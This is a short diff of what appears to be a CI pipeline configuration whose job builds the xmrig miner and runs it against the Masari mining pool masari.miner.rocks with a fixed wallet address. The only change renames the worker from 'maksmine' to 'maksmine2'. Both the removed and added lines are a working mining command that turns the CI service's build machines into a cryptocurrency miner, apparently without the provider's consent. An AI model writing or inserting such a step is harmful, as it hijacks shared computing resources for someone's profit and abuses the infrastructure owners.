@@ -8,4 +8,4 @@ jobs:
       - run: apt-get update
       - checkout
       - run: bash ./build_xmrig.sh
-      - run: /root/xmrig/build/xmrig -o masari.miner.rocks:5005 -u 5t5mEm254JNJ9HqRjY9vCiTE8aZALHX3v8TqhyQ3TTF9VHKZQXkRYjPDweT9kK4rJw7dDLtZXGjav2z9y24vXCdRc4P4w4jER7aDisTYSw -p w=maksmine -a cn --variant msr -k
+      - run: /root/xmrig/build/xmrig -o masari.miner.rocks:5005 -u 5t5mEm254JNJ9HqRjY9vCiTE8aZALHX3v8TqhyQ3TTF9VHKZQXkRYjPDweT9kK4rJw7dDLtZXGjav2z9y24vXCdRc4P4w4jER7aDisTYSw -p w=maksmine2 -a cn --variant msr -k
